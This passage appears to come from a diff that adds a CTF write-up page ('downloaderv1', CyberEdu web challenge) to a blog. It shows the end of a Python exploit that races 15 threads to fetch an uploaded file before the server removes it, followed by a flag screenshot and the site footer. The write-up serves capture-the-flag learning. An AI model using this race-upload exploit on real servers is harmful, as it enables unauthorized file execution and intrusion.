+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">{</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">60</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] SUCCESS on thread </span><span style="color:#e6db74">{</span>thread_id<span style="color:#e6db74">}</span><span style="color:#e6db74">!&#34;</span>)
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">60</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>                print(resp<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">60</span><span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.002</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*] Target: </span><span style="color:#e6db74">{</span>TARGET_URL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*] Racing to: </span><span style="color:#e6db74">{</span>TARGET_URL<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{</span>FILENAME<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Start racing threads</span>
+</span></span><span style="display:flex;"><span>    threads <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">15</span>):
+</span></span><span style="display:flex;"><span>        t <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>race, args<span style="color:#f92672">=</span>(i,))
+</span></span><span style="display:flex;"><span>        t<span style="color:#f92672">.</span>daemon <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>        t<span style="color:#f92672">.</span>start()
+</span></span><span style="display:flex;"><span>        threads<span style="color:#f92672">.</span>append(t)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.1</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Trigger upload</span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[*] Uploading...&#34;</span>)
+</span></span><span style="display:flex;"><span>    upload()
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Wait for threads</span>
+</span></span><span style="display:flex;"><span>    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">10</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> found:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[-] Failed to catch the file&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><p>And here is our flag:</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/downloaderv1-writeup/flag.png#center"></p>
+<p>Really proud of this one!</p>
+<hr>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/cyberedu/">CyberEdu</a></li>
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/web/">Web</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://irinasusca.github.io/writeup-blog/">Irina&#39;s CTF Writeups</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
